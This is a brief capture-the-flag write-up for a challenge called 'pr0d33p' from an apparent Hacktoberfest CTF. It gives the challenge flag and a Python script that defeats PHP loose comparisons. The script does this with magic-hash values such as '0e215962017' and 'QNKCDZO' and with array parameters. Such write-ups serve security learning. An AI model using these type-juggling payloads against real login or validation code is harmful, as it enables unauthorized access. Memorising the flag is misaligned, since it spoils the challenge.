# pr0d33p - Challenge Title

## Challenge Flag: hacktoberfest_ctf{3qu4l17y_1s_n07_1d3nt17y_hehe_1337_0xcafebabe_cafedead}

## Write-up:

I had previously seen this type of challenges. So I better started creating automated script using python. The used code is-

```
import requests, re
headers = {'User-agent': 'Yes, I am a human.', 'Sagarmatha-Hacktoberfest-CTF': 'https://hacktober.tk/'}
params = {'ctf':'0e215962017', 'parm': '240610708', 'mrap': 'QNKCDZO'}
r = requests.post("https://php.0daygod.xyz/?hello=hi&world=0X10001&nice[]=a&ecin[]=b", headers = headers, data=params)

flag_list = re.findall('hacktoberfest_ctf{.*?}', r.text)

print(flag_list[-1])
```

Run this and got the flag ;p
